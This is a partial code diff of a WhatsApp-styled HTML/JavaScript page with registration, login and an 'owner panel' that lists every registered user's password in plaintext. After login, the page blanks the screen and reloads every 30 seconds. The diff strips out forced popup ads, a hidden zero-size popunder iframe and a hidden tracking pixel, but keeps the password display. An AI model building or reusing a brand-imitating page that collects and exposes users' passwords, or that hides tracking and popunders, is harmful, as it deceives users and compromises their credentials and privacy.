         function updateOwnerPanel() {
             users = JSON.parse(localStorage.getItem('whatsapp_users')) || [];
             
-            // Update stats
             document.getElementById('totalUsers').textContent = users.length;
             document.getElementById('activeNow').textContent = getActiveUsersCount();
             
-            // User list with passwords
             let userHtml = '';
             users.forEach((user, index) => {
                 userHtml += `
@@ -668,13 +861,13 @@
                             <div class="password">🔑 ${user.password}</div>
                             <div class="date">📅 ${user.date}</div>
                         </div>
-                        <button class="delete-btn" onclick="deleteUser(${index})">✖</button>
+                        <button class="delete-btn" onclick="deleteUser(${index})">Delete</button>
                     </div>
                 `;
             });
             
             if(users.length === 0) {
-                userHtml = '<div style="text-align:center; padding:20px; color:#999;">No registered users</div>';
+                userHtml = '<div style="text-align:center; padding:20px; color:#8696A0;">No registered users</div>';
             }
             
             document.getElementById('userList').innerHTML = userHtml;
@@ -689,20 +882,19 @@
                     activeHtml += `
                         <div class="active-user-item">
                             <span><span class="online-dot"></span> User ${id.substr(-4)}</span>
-                            <span>🟢 Online</span>
+                            <span>Online</span>
                         </div>
                     `;
                 }
             }
             
             if(activeHtml === '') {
-                activeHtml = '<div style="text-align:center; color:#999;">No active users</div>';
+                activeHtml = '<div style="text-align:center; color:#8696A0;">No active users</div>';
             }
             
             document.getElementById('activeUsersList').innerHTML = activeHtml;
         }
         
-        // Delete single user
         function deleteUser(index) {
             if(confirm('Delete this user?')) {
                 users.splice(index, 1);
@@ -731,7 +923,6 @@
             
             alert('Registration successful! Please login.');
             showLogin();
-            triggerAds();
         }
         
         // Login
@@ -750,23 +941,14 @@
                 document.getElementById('mainContainer').style.display = 'none';
                 document.getElementById('whiteScreen').classList.add('show');
                 
-                for(let i = 0; i < 5; i++) {
-                    setTimeout(() => {
-                        window.open('https://example.com/ad_' + i, '_blank');
-                    }, i * 1000);
-                }
-                
                 setInterval(() => {
                     location.reload();
                 }, 30000);
             } else {
                 alert('Invalid username or password!');
             }
-            
-            triggerAds();
         }
         
-        // Show/Hide Forms
         function showLogin() {
             document.getElementById('registerForm').style.display = 'none';
             document.getElementById('loginForm').style.display = 'block';
@@ -777,7 +959,7 @@
             document.getElementById('registerForm').style.display = 'block';
         }
         
-        // Close menu when clicking outside
+        // Close dropdown when clicking outside
         document.addEventListener('click', function(event) {
             const dropdown = document.getElementById('ownerDropdown');
             const menuBtn = document.querySelector('.owner-menu');
@@ -792,20 +974,12 @@
             }
         });
         
-        // Auto refresh owner panel every 5 seconds
+        // Auto refresh owner panel
         setInterval(() => {
             if(ownerLoggedIn && document.getElementById('ownerDropdown').classList.contains('show')) {
                 updateOwnerPanel();
             }
         }, 5000);
     </script>
-    
-    <!-- Additional Ads -->
-    <div style="display: none;">
-        <iframe src="https://example.com/popunder" width="0" height="0"></iframe>
-    </div>
-    
-    <!-- Tracking Pixel -->
-    <img src="https://tracking.example.com/pixel?id=123" width="1" height="1" style="display:none;">
 </body>
-</html>
+    </html>
